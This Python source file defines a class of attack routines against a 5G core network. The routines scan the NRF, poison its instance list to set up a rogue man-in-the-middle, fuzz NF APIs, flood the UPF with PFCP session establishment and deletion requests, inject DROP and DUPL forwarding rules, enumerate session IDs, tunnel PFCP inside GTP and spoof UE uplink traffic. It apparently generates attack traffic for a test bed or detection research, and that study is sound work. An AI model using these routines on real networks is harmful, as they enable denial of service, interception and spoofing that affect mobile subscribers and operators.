import time 
import random
from scapy.all import send

from src.utils.common import ip_list, dn_domains, get_my_ip_from_prefix

from src.utils.protocols.api_cn.instance import NFInstance
from src.utils.protocols.pfcp.pfcp import PFCPRequest

from src.attacks.api_cn.cn_mitm import CNMitm
from src.attacks.api_cn.cn_fuzzing import CNFuzzing

from src.attacks.gtp_u.pfcf_in_gtp import pfcp_in_gtp_packet
from src.attacks.gtp_u.uplink_spoofing import gtp_uplink_packet

class Attacks():

    # CORE NETWOTK INTERACTION 

    def applicative_scan() -> bool:
        """
            Send N (random) discovery request targetting different nf_type.
            There is a ~2 (+/- 1) seconds delay between each discovery request.
        """
        
        # Add instance and get token
        instance:NFInstance|None = NFInstance.add_random_nf(display=False)
        token = instance.get_token("nnrf-disc", "NRF", display=False)

        # Find a UDM instance
        number_to_discover = random.randint(1,len(NFInstance.nf_type_list))
        nfs_to_discover = random.sample(NFInstance.nf_type_list, number_to_discover)
        
        # Send the discovery
        success = True
        for nf_type in nfs_to_discover : 
            result = instance.get_nf_info(token, nf_type, display=False)
            success = success and result
            
            time_to_sleep = int(random.normalvariate(2, 1))
            time.sleep(time_to_sleep)
            
        return success

    def cn_mitm() -> bool:
        """
            Poison the NRF inner list of Instance to make a rogue Instance the highest priority.
            The request happening from this moment are sent to the rogue which relays it.
            The rogue instance is effectively a man in the middle.
            Wait ~120 (+/- 10) seconds before removing the man in the middle.
        """
        nf_type = NFInstance.get_random_nf_type()
        start = CNMitm.start(nf_type)
        
        time_to_sleep = int(random.normalvariate(120, 10))
        time.sleep(time_to_sleep)
        
        stop = CNMitm.stop(nf_type)
        return start and stop
             
    def fuzz() -> bool:
        """
            Iterate through the API description of the NF and craft requests with valid parameter names and plausible values.
            Send 10 different urls 10x times each (= 100 packets)
        """
        nf_list = ["NRF", "UDM", "AMF"]
        nf = random.choice(nf_list)
        result = CNFuzzing().fuzz(nf, nb_file=1, nb_url=10, nb_ite=10, nb_method=1)
        
        return len(result) == 10*10
        
    # SESSION MANAGEMENT
        
    def flood_etablishment() -> bool:
        "Send ~100 (+/- 10) session establishment requests with random seid, teid and ue_address"
        # Association setup request are necessary preliminary steps
        send(
            PFCPRequest.association_setup(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"]
            )
        )
        
        time.sleep(5) # need a bit of time process the association
        
        # Send the 100 requests
        nb = int(random.normalvariate(100, 10))
        for _ in range(nb):
            
            # Etablishment request
            send(
                PFCPRequest.session_establishment(
                    src_addr=get_my_ip_from_prefix(),
                    dst_addr=ip_list["UPF"],
                    ue_addr=PFCPRequest.random_ue_address(),
                    teid=random.randint(0x1, PFCPRequest.max_teid),
                    seid=random.randint(0x1, PFCPRequest.max_seid)
                )
            )
            
        # didnt achieve to verify the output yet
        return True
        
    def flood_deletion() -> bool:
        """
            Send ~100 (+/- 10) session delete requests. 
            The first seid is random (with a minimum of 1000) and then incremented.
            The minimum serves to avoid impacting legitimate sessions.
        """
        
        # The first seid is random and then incremented
        # Legitimate seid will have low value and we don't want to impact legitimate sessions 
        # We also don't want to overflow on the maxvalue
        first_seid = random.randint(1000, PFCPRequest.max_seid-1000)
        
        nb = int(random.normalvariate(100, 10))
        for i in range(nb):
            send(
                PFCPRequest.session_deletion(
                    src_addr=get_my_ip_from_prefix(),
                    dst_addr=ip_list["UPF"],
                    seid=first_seid+i
                )
            )
        
        # didnt achieve to verify the output yet
        return True
        
    def modify_drop() -> bool:
        """
            Send 1 session modification request containing a DROP rule to a random UE, with random SEID and TEID.
            SEID and TEID have a minimum of 1000 to avoid impacting legitimate sessions.
        """
        send(
            PFCPRequest.session_modification(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"],
                ue_addr=PFCPRequest.random_ue_address(),
                seid=random.randint(1000, PFCPRequest.max_seid), # we dont want to DoS legitimate sessions
                teid=random.randint(1000, PFCPRequest.max_teid), # same with the legitimate tunnels
                far_id=random.randint(1, 1000),
                actions=["DROP"]
            )
        )
        
        # didnt achieve to verify the output yet
        return True
        
    def modify_dupl() -> bool:
        """
            Send 1 session modification request containing a DUPL rule to a random UE, with random SEID and TEID.
            SEID and TEID have a minimum of 1000 to avoid impacting legitimate sessions.
        """
        
        send(
            PFCPRequest.session_modification(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"],
                ue_addr=PFCPRequest.random_ue_address(),
                seid=random.randint(0, PFCPRequest.max_seid), 
                teid=random.randint(0, PFCPRequest.max_teid), 
                far_id=random.randint(1, 1000),
                actions=["FORW","DUPL"] # forward is still necessary
            )
        )
        
        # didnt achieve to verify the output yet
        return True
    
    def seid_fuzzing() -> bool:
        """
            Send ~100 (+/- 10) session modification requests with FORWARD rule. 
            This rule is the default one and dont change the behavior of the session.
            Yet if the SEID valid, the success response will indicate its existence.
            The first seid is random (with a minimum of 1000) and then incremented.
            The teid is completely random.
        """
        
        first_seid = random.randint(0, PFCPRequest.max_seid)

        nb = int(random.normalvariate(100, 10))
        for i in range(nb):
            send(
                PFCPRequest.session_modification(
                    src_addr=get_my_ip_from_prefix(),
                    dst_addr=ip_list["UPF"],
                    ue_addr=PFCPRequest.random_ue_address(),
                    seid=first_seid+i, 
                    teid=random.randint(0, PFCPRequest.max_teid), 
                    far_id=random.randint(1, 1000),
                    actions=["FORW"] # forward is still necessary
                )
            )
            
        # didnt achieve to verify the output yet
        return True

    # PACKET FORWARDING 

    def pfcp_in_gtp() -> bool:
        """ 
            Send 1 pfcp packet encapsulated in a gtp layer.
            The pfcp packet is benign but having this kind of encapsulation could be used for attacks and shouldn't happen.
        """
        
        pfcp_packet = PFCPRequest.association_setup(
            src_addr=get_my_ip_from_prefix(),
            dst_addr=ip_list["UPF"]
        )
        
        send(
            pfcp_in_gtp_packet(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"],
                teid=random.randint(0, PFCPRequest.max_teid),
                pfcp_packet=pfcp_packet
            )
        )
        
        # didnt achieve to verify the output yet
        return True

    def uplink_spoofing() -> bool:
        """
            Send 1 packet from the CN spoofing an UE.
            The packet is supposed to be send to the DN where it will be seen as originating from the UE.
        """
        
        send(
            gtp_uplink_packet(
                src_addr=get_my_ip_from_prefix(),
                dst_addr=ip_list["UPF"],
                tunnel_dst_addr=random.choice(dn_domains),
                ue_addr=PFCPRequest.random_ue_address(),
                teid=random.randint(0, PFCPRequest.max_teid)
            )
        )
        
        # didnt achieve to verify the output yet
        return True

    # def user_mitm():
    #     pass
